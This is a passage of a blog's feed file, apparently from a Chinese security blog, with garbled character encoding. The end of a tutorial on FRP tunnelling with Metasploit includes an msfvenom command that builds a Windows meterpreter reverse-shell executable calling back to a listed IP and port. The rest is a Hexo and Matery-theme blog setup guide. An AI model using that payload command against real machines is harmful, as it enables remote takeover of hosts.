src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191707667.png" alt="img"></p><p>å¯åŠ¨MSFç›‘å¬ï¼š</p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191707536.png" alt="img"></p><p>ä½¿ç”¨msfç”Ÿæˆpayloadå®ç°ä¸»æœºä¸Šçº¿ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">msfvenom <span class="token operator">-</span>p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp  lhost<span class="token operator">=</span><span class="token number">45.32</span><span class="token number">.38</span><span class="token number">.119</span> lport<span class="token operator">=</span><span class="token number">10015</span> <span class="token operator">-</span>f exe <span class="token operator">-</span>o frptest<span class="token punctuation">.</span>exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191707254.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191707659.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191707135.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> FRP MSF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexoæ­å»ºä¸ªäººåšå®¢ç³»åˆ—ï¼šåŸºç¡€å»ºç«™ç¯‡</title>
      <link href="/2022/01/19/hexo-da-jian-ge-ren-bo-ke-xi-lie-ji-chu-jian-zhan-pian/"/>
      <url>/2022/01/19/hexo-da-jian-ge-ren-bo-ke-xi-lie-ji-chu-jian-zhan-pian/</url>
      
        <content type="html"><![CDATA[<p>Hexo æ˜¯ä¸€ä¸ªé«˜æ•ˆç®€æ´çš„é™æ€åšå®¢æ¡†æ¶ï¼Œæ”¯æŒ Markdown å†™ä½œè¯­æ³•ï¼Œæ’ä»¶ä¸°å¯Œï¼Œä¸»é¢˜ä¼˜é›…ï¼Œéƒ¨ç½²æ–¹ä¾¿ã€‚ç›®å‰å·²æˆä¸ºå¤šæ•°äººåšå®¢å»ºç«™çš„é€‰æ‹©ã€‚</p><h1 id="å¼€å§‹ä½¿ç”¨"><a href="#å¼€å§‹ä½¿ç”¨" class="headerlink" title="å¼€å§‹ä½¿ç”¨"></a>å¼€å§‹ä½¿ç”¨</h1><p>ä½¿ç”¨å‘½ä»¤è¡Œä¸­é€šè¿‡ npm æ¥å®‰è£… Hexoï¼š</p><pre class="line-numbers language-none"><code class="language-none">npm install -g hexo-cli<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>-g</code> è¡¨ç¤ºå…¨å±€å®‰è£…ï¼Œä¼šå°† Hexo å‘½ä»¤åŠ å…¥ç¯å¢ƒå˜é‡ä¸­ï¼Œä»¥ä½¿å…¶åœ¨ cmd ä¸‹æœ‰æ•ˆã€‚</p><p>Hexo ä¾èµ–äº <a href="https://nodejs.org/zh-cn/">Node.js</a> å’Œ <a href="https://git-scm.com/download/">git</a>ï¼Œæ‰€ä»¥åœ¨å®‰è£… Hexo ä¹‹å‰å…ˆç¡®ä¿å·²å®‰è£…äº†è¿™ä¸¤é¡¹åº”ç”¨ã€‚</p><p>æ–°å»ºåšå®¢ç›®å½•ï¼Œç„¶ååœ¨è¯¥è·¯å¾„ä¸‹æ‰§è¡Œåˆå§‹åŒ–å‘½ä»¤ï¼š</p><pre class="line-numbers language-none"><code class="language-none">hexo init<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å®˜æ–¹æ•™ç¨‹ä¸­æåˆ°è¦åœ¨é¡¹ç›®ç›®å½•ä¸‹æ‰§è¡Œ <code>npm install</code> å‘½ä»¤ï¼Œäº‹å®ä¸Šä¸å¿…å¦‚æ­¤ï¼Œåœ¨æ‰§è¡Œ <code>hexo init</code> çš„è¿‡ç¨‹ä¸­å°±å·²ç»è‡ªåŠ¨å®‰è£…å¥½äº†é¡¹ç›®ä¾èµ–ã€‚</p><p>æ‰§è¡Œå®Œæ¯•åï¼Œå°†ä¼šç”Ÿæˆä»¥ä¸‹æ–‡ä»¶ç»“æ„ï¼š</p><pre class="line-numbers language-none"><code class="language-none">.â”œâ”€â”€ node_modules       &#x2F;&#x2F;ä¾èµ–å®‰è£…ç›®å½•â”œâ”€â”€ scaffolds          &#x2F;&#x2F;æ¨¡æ¿æ–‡ä»¶å¤¹ï¼Œæ–°å»ºçš„æ–‡ç« å°†ä¼šä»æ­¤ç›®å½•ä¸‹çš„æ–‡ä»¶ä¸­ç»§æ‰¿æ ¼å¼|   â”œâ”€â”€ draft.md         &#x2F;&#x2F;è‰ç¨¿æ¨¡æ¿|   â”œâ”€â”€ page.md          &#x2F;&#x2F;é¡µé¢æ¨¡æ¿|   â””â”€â”€ post.md          &#x2F;&#x2F;æ–‡ç« æ¨¡æ¿â”œâ”€â”€ source             &#x2F;&#x2F;èµ„æºæ–‡ä»¶å¤¹ï¼Œç”¨äºæ”¾ç½®å›¾ç‰‡ã€æ•°æ®ã€æ–‡ç« ç­‰èµ„æº|   â””â”€â”€ _posts           &#x2F;&#x2F;æ–‡ç« ç›®å½•â”œâ”€â”€ themes             &#x2F;&#x2F;ä¸»é¢˜æ–‡ä»¶å¤¹|   â””â”€â”€ landscape        &#x2F;&#x2F;é»˜è®¤ä¸»é¢˜â”œâ”€â”€ .gitignore         &#x2F;&#x2F;æŒ‡å®šä¸çº³å…¥gitç‰ˆæœ¬æ§åˆ¶çš„æ–‡ä»¶â”œâ”€â”€ _config.yml        &#x2F;&#x2F;ç«™ç‚¹é…ç½®æ–‡ä»¶â”œâ”€â”€ db.json            â”œâ”€â”€ package.jsonâ””â”€â”€ package-lock.json<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨æ ¹ç›®å½•ä¸‹æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å¯åŠ¨ hexo çš„å†…ç½® Web æœåŠ¡å™¨</p><pre class="line-numbers language-none"><code class="language-none">hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¯¥å‘½ä»¤å°†ä¼šè°ƒç”¨ Markdown å¼•æ“è§£æé¡¹ç›®ä¸­çš„åšå®¢å†…å®¹ç”Ÿæˆç½‘é¡µèµ„æºï¼Œèµ„æºå°†ä¼šå­˜äºå†…å­˜ä¸­ï¼Œæ‰€ä»¥ç”¨æˆ·æ‰§è¡Œå®Œå‘½ä»¤ä¹‹ååœ¨é¡¹ç›®æ–‡ä»¶å¤¹ä¸­æ˜¯æ‰¾ä¸åˆ°ç›¸å…³çš„ Web èµ„æºç›®å½•çš„ã€‚è¯¥å‘½ä»¤è¿˜ä¼šå¯åŠ¨ä¸€ä¸ªç®€æ˜“çš„ Web æœåŠ¡å™¨ç”¨äºæä¾›å¯¹å†…å­˜ä¸­ç½‘é¡µèµ„æºçš„è®¿é—®ï¼ˆå·¥ä½œæœºåˆ¶ç±»ä¼¼äº webpack-dev-serverï¼‰ï¼ŒWeb æœåŠ¡å™¨é»˜è®¤ç›‘å¬ 4000 ç«¯å£ï¼Œç”¨æˆ·å¯åœ¨æµè§ˆå™¨ä¸­é€šè¿‡åœ°å€ <code>localhost:4000</code> è®¿é—®åšå®¢ã€‚</p><p><a href="http://yearito-1256884783.image.myqcloud.com/hexo-get-started/20181102070503130.png"><img src="http://yearito-1256884783.image.myqcloud.com/hexo-get-started/20181102070503130.png" alt="Hexo é»˜è®¤ä¸»é¢˜é¦–é¡µ"></a></p><p><a href="http://yearito-1256884783.image.myqcloud.com/hexo-get-started/20181102070503130.png">Hexo é»˜è®¤ä¸»é¢˜é¦–é¡µ</a></p><p>æ­¤å¤–ï¼Œå¯ä»¥é€šè¿‡æ·»åŠ å‘½ä»¤è¡Œå‚æ•°æ¥æ”¯æŒé«˜çº§ç”¨æ³•ï¼š</p><ul><li>å½“ 4000 ç«¯å£å·²è¢«å…¶ä»–åº”ç”¨å ç”¨æ—¶ï¼Œå¯ä»¥æ·»åŠ  <code>-p</code> / <code>--port</code> å‚æ•°æ¥è®¾ç½® Web æœåŠ¡ç›‘å¬çš„ç«¯å£å·ï¼Œå¦‚<code>hexo s -p 8000</code></li><li>é»˜è®¤æƒ…å†µä¸‹ï¼Œhexo ç›‘å¬é¡¹ç›®ç›®å½•çš„æ–‡ä»¶å˜åŒ–ï¼Œç”¨æˆ·å¯¹äºé¡¹ç›®æ–‡ä»¶çš„ä»»ä½•æ”¹åŠ¨éƒ½ä¼šè§¦å‘å®æ—¶è§£æç¼–è¯‘å¹¶æ›´æ–°å†…å­˜ä¸­çš„ç½‘é¡µèµ„æºï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç”¨æˆ·åœ¨æœ¬åœ°ä¿®æ”¹ååˆ·æ–°æµè§ˆå™¨å°±å¯ä»¥çœ‹åˆ°æ”¹åŠ¨æ•ˆæœã€‚å¦‚æœä¸å¸Œæœ› hexo ç›‘å¬é¡¹ç›®ç›®å½•çš„æ–‡ä»¶å˜åŒ–ï¼Œå¯ä»¥æ·»åŠ  <code>-s</code> / <code>--static</code> å‚æ•°ï¼Œè¿™æ ·æœ¬åœ°æ”¹åŠ¨å°±ä¸ä¼šè§¦å‘ hexo å®æ—¶è§£ææ›´æ–°ã€‚</li></ul><h1 id="æ›´æ¢-Materyä¸»é¢˜"><a href="#æ›´æ¢-Materyä¸»é¢˜" class="headerlink" title="æ›´æ¢ Materyä¸»é¢˜"></a>æ›´æ¢ Materyä¸»é¢˜</h1><ul><li><p>ä¸‹è½½</p><p>æœ¬ä¸»é¢˜<strong>æ¨èä½ ä½¿ç”¨ Hexo 5.0.0 åŠä»¥ä¸Šçš„ç‰ˆæœ¬</strong>ã€‚å¦‚æœï¼Œä½ å·²ç»æœ‰ä¸€ä¸ªè‡ªå·±çš„ <a href="https://hexo.io/zh-cn/">Hexo</a> åšå®¢äº†ï¼Œå»ºè®®ä½ å°† Hexo å‡çº§åˆ°æœ€æ–°ç¨³å®šçš„ç‰ˆæœ¬ã€‚</p><p>ç‚¹å‡» <a href="https://codeload.github.com/blinkfox/hexo-theme-matery/zip/master">è¿™é‡Œ</a> ä¸‹è½½ <code>master</code> åˆ†æ”¯çš„æœ€æ–°ç¨³å®šç‰ˆçš„ä»£ç ï¼Œè§£å‹ç¼©åï¼Œå°† <code>hexo-theme-matery</code> çš„æ–‡ä»¶å¤¹å¤åˆ¶åˆ°ä½  Hexo çš„ <code>themes</code> æ–‡ä»¶å¤¹ä¸­å³å¯ã€‚</p><p>å½“ç„¶ä½ ä¹Ÿå¯ä»¥åœ¨ä½ çš„ <code>themes</code> æ–‡ä»¶å¤¹ä¸‹ä½¿ç”¨ <code>git clone</code> å‘½ä»¤æ¥ä¸‹è½½:</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;blinkfox&#x2F;hexo-theme-matery.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h2><h3 id="åˆ‡æ¢ä¸»é¢˜"><a href="#åˆ‡æ¢ä¸»é¢˜" class="headerlink" title="åˆ‡æ¢ä¸»é¢˜"></a>åˆ‡æ¢ä¸»é¢˜</h3><p>ä¿®æ”¹ Hexo æ ¹ç›®å½•ä¸‹çš„ <code>_config.yml</code> çš„ <code>theme</code> çš„å€¼ï¼š<code>theme: hexo-theme-matery</code></p><h4 id="config-yml-æ–‡ä»¶çš„å…¶å®ƒä¿®æ”¹å»ºè®®"><a href="#config-yml-æ–‡ä»¶çš„å…¶å®ƒä¿®æ”¹å»ºè®®" class="headerlink" title="_config.yml æ–‡ä»¶çš„å…¶å®ƒä¿®æ”¹å»ºè®®:"></a><code>_config.yml</code> æ–‡ä»¶çš„å…¶å®ƒä¿®æ”¹å»ºè®®:</h4><ul><li>è¯·ä¿®æ”¹ <code>_config.yml</code> çš„ <code>url</code> çš„å€¼ä¸ºä½ çš„ç½‘ç«™ä¸» <code>URL</code>ï¼ˆå¦‚ï¼š<code>http://xxx.github.io</code>ï¼‰ã€‚</li><li>å»ºè®®ä¿®æ”¹ä¸¤ä¸ª <code>per_page</code> çš„åˆ†é¡µæ¡æ•°å€¼ä¸º <code>6</code> çš„å€æ•°ï¼Œå¦‚ï¼š<code>12</code>ã€<code>18</code> ç­‰ï¼Œè¿™æ ·æ–‡ç« åˆ—è¡¨åœ¨å„ä¸ªå±å¹•ä¸‹éƒ½èƒ½è¾ƒå¥½çš„æ˜¾ç¤ºã€‚</li><li>å¦‚æœä½ æ˜¯ä¸­æ–‡ç”¨æˆ·ï¼Œåˆ™å»ºè®®ä¿®æ”¹ <code>language</code> çš„å€¼ä¸º <code>zh-CN</code>ã€‚</li></ul><h3 id="æ–°å»ºåˆ†ç±»-categories-é¡µ"><a href="#æ–°å»ºåˆ†ç±»-categories-é¡µ" class="headerlink" title="æ–°å»ºåˆ†ç±» categories é¡µ"></a>æ–°å»ºåˆ†ç±» categories é¡µ</h3><p><code>categories</code> é¡µæ˜¯ç”¨æ¥å±•ç¤ºæ‰€æœ‰åˆ†ç±»çš„é¡µé¢ï¼Œå¦‚æœåœ¨ä½ çš„åšå®¢ <code>source</code> ç›®å½•ä¸‹è¿˜æ²¡æœ‰ <code>categories/index.md</code> æ–‡ä»¶ï¼Œé‚£ä¹ˆä½ å°±éœ€è¦æ–°å»ºä¸€ä¸ªï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">hexo new page &quot;categories&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç¼–è¾‘ä½ åˆšåˆšæ–°å»ºçš„é¡µé¢æ–‡ä»¶ <code>/source/categories/index.md</code>ï¼Œè‡³å°‘éœ€è¦ä»¥ä¸‹å†…å®¹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">---title: categoriesdate: 2018-09-30 17:25:30type: &quot;categories&quot;layout: &quot;categories&quot;---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ–°å»ºæ ‡ç­¾-tags-é¡µ"><a href="#æ–°å»ºæ ‡ç­¾-tags-é¡µ" class="headerlink" title="æ–°å»ºæ ‡ç­¾ tags é¡µ"></a>æ–°å»ºæ ‡ç­¾ tags é¡µ</h3><p><code>tags</code> é¡µæ˜¯ç”¨æ¥å±•ç¤ºæ‰€æœ‰æ ‡ç­¾çš„é¡µé¢ï¼Œå¦‚æœåœ¨ä½ çš„åšå®¢ <code>source</code> ç›®å½•ä¸‹è¿˜æ²¡æœ‰ <code>tags/index.md</code> æ–‡ä»¶ï¼Œé‚£ä¹ˆä½ å°±éœ€è¦æ–°å»ºä¸€ä¸ªï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">hexo new page &quot;tags&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç¼–è¾‘ä½ åˆšåˆšæ–°å»ºçš„é¡µé¢æ–‡ä»¶ <code>/source/tags/index.md</code>ï¼Œè‡³å°‘éœ€è¦ä»¥ä¸‹å†…å®¹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">---title: tagsdate: 2018-09-30 18:23:38type: &quot;tags&quot;layout: &quot;tags&quot;---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ–°å»ºå…³äºæˆ‘-about-é¡µ"><a href="#æ–°å»ºå…³äºæˆ‘-about-é¡µ" class="headerlink" title="æ–°å»ºå…³äºæˆ‘ about é¡µ"></a>æ–°å»ºå…³äºæˆ‘ about é¡µ</h3><p><code>about</code> é¡µæ˜¯ç”¨æ¥å±•ç¤º<strong>å…³äºæˆ‘å’Œæˆ‘çš„åšå®¢</strong>ä¿¡æ¯çš„é¡µé¢ï¼Œå¦‚æœåœ¨ä½ çš„åšå®¢ <code>source</code> ç›®å½•ä¸‹è¿˜æ²¡æœ‰ <code>about/index.md</code> æ–‡ä»¶ï¼Œé‚£ä¹ˆä½ å°±éœ€è¦æ–°å»ºä¸€ä¸ªï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">hexo new page &quot;about&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç¼–è¾‘ä½ åˆšåˆšæ–°å»ºçš„é¡µé¢æ–‡ä»¶ <code>/source/about/index.md</code>ï¼Œè‡³å°‘éœ€è¦ä»¥ä¸‹å†…å®¹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">---title: aboutdate: 2018-09-30 17:25:30type: &quot;about&quot;layout: &quot;about&quot;---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ–°å»ºç•™è¨€æ¿-contact-é¡µï¼ˆå¯é€‰çš„ï¼‰"><a href="#æ–°å»ºç•™è¨€æ¿-contact-é¡µï¼ˆå¯é€‰çš„ï¼‰" class="headerlink" title="æ–°å»ºç•™è¨€æ¿ contact é¡µï¼ˆå¯é€‰çš„ï¼‰"></a>æ–°å»ºç•™è¨€æ¿ contact é¡µï¼ˆå¯é€‰çš„ï¼‰</h3><p><code>contact</code> é¡µæ˜¯ç”¨æ¥å±•ç¤º<strong>ç•™è¨€æ¿</strong>ä¿¡æ¯çš„é¡µé¢ï¼Œå¦‚æœåœ¨ä½ çš„åšå®¢ <code>source</code> ç›®å½•ä¸‹è¿˜æ²¡æœ‰ <code>contact/index.md</code> æ–‡ä»¶ï¼Œé‚£ä¹ˆä½ å°±éœ€è¦æ–°å»ºä¸€ä¸ªï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">hexo new page &quot;contact&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç¼–è¾‘ä½ åˆšåˆšæ–°å»ºçš„é¡µé¢æ–‡ä»¶ <code>/source/contact/index.md</code>ï¼Œè‡³å°‘éœ€è¦ä»¥ä¸‹å†…å®¹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">---title: contactdate: 2018-09-30 17:25:30type: &quot;contact&quot;layout: &quot;contact&quot;---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>æ³¨</strong>ï¼šæœ¬ç•™è¨€æ¿åŠŸèƒ½ä¾èµ–äºç¬¬ä¸‰æ–¹è¯„è®ºç³»ç»Ÿï¼Œè¯·<strong>æ¿€æ´»</strong>ä½ çš„è¯„è®ºç³»ç»Ÿæ‰æœ‰æ•ˆæœã€‚å¹¶ä¸”åœ¨ä¸»é¢˜çš„ <code>_config.yml</code> æ–‡ä»¶ä¸­ï¼Œç¬¬ <code>19</code> è‡³ <code>21</code> è¡Œçš„â€œ<strong>èœå•</strong>â€é…ç½®ï¼Œå–æ¶ˆå…³äºç•™è¨€æ¿çš„æ³¨é‡Šå³å¯ã€‚</p></blockquote><h3 id="æ–°å»ºå‹æƒ…é“¾æ¥-friends-é¡µï¼ˆå¯é€‰çš„ï¼‰"><a href="#æ–°å»ºå‹æƒ…é“¾æ¥-friends-é¡µï¼ˆå¯é€‰çš„ï¼‰" class="headerlink" title="æ–°å»ºå‹æƒ…é“¾æ¥ friends é¡µï¼ˆå¯é€‰çš„ï¼‰"></a>æ–°å»ºå‹æƒ…é“¾æ¥ friends é¡µï¼ˆå¯é€‰çš„ï¼‰</h3><p><code>friends</code> é¡µæ˜¯ç”¨æ¥å±•ç¤º<strong>å‹æƒ…é“¾æ¥</strong>ä¿¡æ¯çš„é¡µé¢ï¼Œå¦‚æœåœ¨ä½ çš„åšå®¢ <code>source</code> ç›®å½•ä¸‹è¿˜æ²¡æœ‰ <code>friends/index.md</code> æ–‡ä»¶ï¼Œé‚£ä¹ˆä½ å°±éœ€è¦æ–°å»ºä¸€ä¸ªï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">hexo new page &quot;friends&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç¼–è¾‘ä½ åˆšåˆšæ–°å»ºçš„é¡µé¢æ–‡ä»¶ <code>/source/friends/index.md</code>ï¼Œè‡³å°‘éœ€è¦ä»¥ä¸‹å†…å®¹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">---title: friendsdate: 2018-12-12 21:25:30type: &quot;friends&quot;layout: &quot;friends&quot;---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åŒæ—¶ï¼Œåœ¨ä½ çš„åšå®¢ <code>source</code> ç›®å½•ä¸‹æ–°å»º <code>_data</code> ç›®å½•ï¼Œåœ¨ <code>_data</code> ç›®å½•ä¸­æ–°å»º <code>friends.json</code> æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼š</p><pre class="line-numbers language-none"><code class="language-none">[&#123;    &quot;avatar&quot;: &quot;http:&#x2F;&#x2F;image.luokangyuan.com&#x2F;1_qq_27922023.jpg&quot;,    &quot;name&quot;: &quot;ç é…±&quot;,    &quot;introduction&quot;: &quot;æˆ‘ä¸æ˜¯å¤§ä½¬ï¼Œåªæ˜¯åœ¨è¿½å¯»å¤§ä½¬çš„è„šæ­¥&quot;,    &quot;url&quot;: &quot;http:&#x2F;&#x2F;luokangyuan.com&#x2F;&quot;,    &quot;title&quot;: &quot;å‰å»å­¦ä¹ &quot;&#125;, &#123;    &quot;avatar&quot;: &quot;http:&#x2F;&#x2F;image.luokangyuan.com&#x2F;4027734.jpeg&quot;,    &quot;name&quot;: &quot;é—ªçƒä¹‹ç‹&quot;,    &quot;introduction&quot;: &quot;ç¼–ç¨‹ç•Œå¤§ä½¬ï¼ŒæŠ€æœ¯ç‰›ï¼Œäººè¿˜ç‰¹åˆ«å¥½ï¼Œä¸æ‡‚çš„éƒ½å¯ä»¥è¯·æ•™å¤§ä½¬&quot;,    &quot;url&quot;: &quot;https:&#x2F;&#x2F;blinkfox.github.io&#x2F;&quot;,    &quot;title&quot;: &quot;å‰å»å­¦ä¹ &quot;&#125;, &#123;    &quot;avatar&quot;: &quot;http:&#x2F;&#x2F;image.luokangyuan.com&#x2F;avatar.jpg&quot;,    &quot;name&quot;: &quot;ja_rome&quot;,    &quot;introduction&quot;: &quot;å¹³å‡¡çš„è„šæ­¥ä¹Ÿå¯ä»¥èµ°å‡ºä¼Ÿå¤§çš„è¡Œç¨‹&quot;,    &quot;url&quot;: &quot;https:&#x2F;&#x2F;me.csdn.net&#x2F;jlh912008548&quot;,    &quot;title&quot;: &quot;å‰å»å­¦ä¹ &quot;&#125;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ–°å»º-404-é¡µ"><a href="#æ–°å»º-404-é¡µ" class="headerlink" title="æ–°å»º 404 é¡µ"></a>æ–°å»º 404 é¡µ</h3><p>å¦‚æœåœ¨ä½ çš„åšå®¢ <code>source</code> ç›®å½•ä¸‹è¿˜æ²¡æœ‰ <code>404.md</code> æ–‡ä»¶ï¼Œé‚£ä¹ˆä½ å°±éœ€è¦æ–°å»ºä¸€ä¸ª</p><pre class="line-numbers language-none"><code class="language-none">hexo new page 404<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç¼–è¾‘ä½ åˆšåˆšæ–°å»ºçš„é¡µé¢æ–‡ä»¶ <code>/source/404/index.md</code>ï¼Œè‡³å°‘éœ€è¦ä»¥ä¸‹å†…å®¹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">---title: 404date: 2018-09-30 17:25:30type: &quot;404&quot;layout: &quot;404&quot;description: &quot;Oopsï½ï¼Œæˆ‘å´©æºƒäº†ï¼æ‰¾ä¸åˆ°ä½ æƒ³è¦çš„é¡µé¢ :(&quot;---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="èœå•å¯¼èˆªé…ç½®"><a href="#èœå•å¯¼èˆªé…ç½®" class="headerlink" title="èœå•å¯¼èˆªé…ç½®"></a>èœå•å¯¼èˆªé…ç½®</h3><h4 id="é…ç½®åŸºæœ¬èœå•å¯¼èˆªçš„åç§°ã€è·¯å¾„urlå’Œå›¾æ ‡icon"><a href="#é…ç½®åŸºæœ¬èœå•å¯¼èˆªçš„åç§°ã€è·¯å¾„urlå’Œå›¾æ ‡icon" class="headerlink" title="é…ç½®åŸºæœ¬èœå•å¯¼èˆªçš„åç§°ã€è·¯å¾„urlå’Œå›¾æ ‡icon."></a>é…ç½®åŸºæœ¬èœå•å¯¼èˆªçš„åç§°ã€è·¯å¾„urlå’Œå›¾æ ‡icon.</h4><p>1.èœå•å¯¼èˆªåç§°å¯ä»¥æ˜¯ä¸­æ–‡ä¹Ÿå¯ä»¥æ˜¯è‹±æ–‡(å¦‚ï¼š<code>Index</code>æˆ–<code>ä¸»é¡µ</code>) 2.å›¾æ ‡icon å¯ä»¥åœ¨<a href="https://fontawesome.com/icons">Font Awesome</a> ä¸­æŸ¥æ‰¾</p><pre class="line-numbers language-none"><code class="language-none">menu:  Index:    url: &#x2F;    icon: fas fa-home  Tags:    url: &#x2F;tags    icon: fas fa-tags  Categories:    url: &#x2F;categories    icon: fas fa-bookmark  Archives:    url: &#x2F;archives    icon: fas fa-archive  About:    url: &#x2F;about    icon: fas fa-user-circle  Friends:    url: &#x2F;friends    icon: fas fa-address-book<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="äºŒçº§èœå•é…ç½®æ–¹æ³•"><a href="#äºŒçº§èœå•é…ç½®æ–¹æ³•" class="headerlink" title="äºŒçº§èœå•é…ç½®æ–¹æ³•"></a>äºŒçº§èœå•é…ç½®æ–¹æ³•</h4><p>å¦‚æœä½ éœ€è¦äºŒçº§èœå•åˆ™å¯ä»¥åœ¨åŸåŸºæœ¬èœå•å¯¼èˆªçš„åŸºç¡€ä¸Šå¦‚ä¸‹æ“ä½œ</p><ol><li>åœ¨éœ€è¦æ·»åŠ äºŒçº§èœå•çš„ä¸€çº§èœå•ä¸‹æ·»åŠ <code>children</code>å…³é”®å­—(å¦‚:<code>About</code>èœå•ä¸‹æ·»åŠ <code>children</code>)</li><li>åœ¨<code>children</code>ä¸‹åˆ›å»ºäºŒçº§èœå•çš„ åç§°name,è·¯å¾„urlå’Œå›¾æ ‡icon.</li><li>æ³¨æ„æ¯ä¸ªäºŒçº§èœå•æ¨¡å—å‰è¦åŠ  <code>-</code>.</li><li>æ³¨æ„ç¼©è¿›æ ¼å¼</li></ol><pre class="line-numbers language-none"><code class="language-none">menu:  Index:    url: &#x2F;    icon: fas fa-home  Tags:    url: &#x2F;tags    icon: fas fa-tags  Categories:    url: &#x2F;categories    icon: fas fa-bookmark  Archives:    url: &#x2F;archives    icon: fas fa-archive  About:    url: &#x2F;about    icon: fas fa-user-circle-o  Friends:    url: &#x2F;friends    icon: fas fa-address-book  Medias:    icon: fas fa-list    children:      - name: Music        url: &#x2F;music        icon: fas fa-music      - name: Movies        url: &#x2F;movies        icon: fas fa-film      - name: Books        url: &#x2F;books        icon: fas fa-book      - name: Galleries        url: &#x2F;galleries        icon: fas fa-image<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ä»£ç é«˜äº®"><a href="#ä»£ç é«˜äº®" class="headerlink" title="ä»£ç é«˜äº®"></a>ä»£ç é«˜äº®</h3><p>ä» Hexo5.0 ç‰ˆæœ¬å¼€å§‹è‡ªå¸¦äº† <code>prismjs</code> ä»£ç è¯­æ³•é«˜äº®çš„æ”¯æŒï¼Œæœ¬ä¸»é¢˜å¯¹æ­¤è¿›è¡Œäº†æ”¹é€ æ”¯æŒã€‚</p><p>å¦‚æœä½ çš„åšå®¢ä¸­æ›¾ç»å®‰è£…è¿‡ <code>hexo-prism-plugin</code> çš„æ’ä»¶ï¼Œé‚£ä¹ˆä½ é¡»è¦æ‰§è¡Œ <code>npm uninstall hexo-prism-plugin</code> æ¥å¸è½½æ‰å®ƒï¼Œå¦åˆ™ç”Ÿæˆçš„ä»£ç ä¸­ä¼šæœ‰ <code>&#123;</code> å’Œ <code>&#125;</code> çš„è½¬ä¹‰å­—ç¬¦ã€‚</p><p>ç„¶åï¼Œä¿®æ”¹ Hexo æ ¹ç›®å½•ä¸‹ <code>_config.yml</code> æ–‡ä»¶ä¸­ <code>highlight.enable</code> çš„å€¼ä¸º <code>false</code>ï¼Œå¹¶å°† <code>prismjs.enable</code> çš„å€¼è®¾ç½®ä¸º <code>true</code>ï¼Œä¸»è¦é…ç½®å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">highlight:  enable: false  line_number: true  auto_detect: false  tab_replace: &#39;&#39;  wrap: true  hljs: falseprismjs:  enable: true  preprocess: true  line_number: true  tab_replace: &#39;&#39;<span aria-hidden="true" 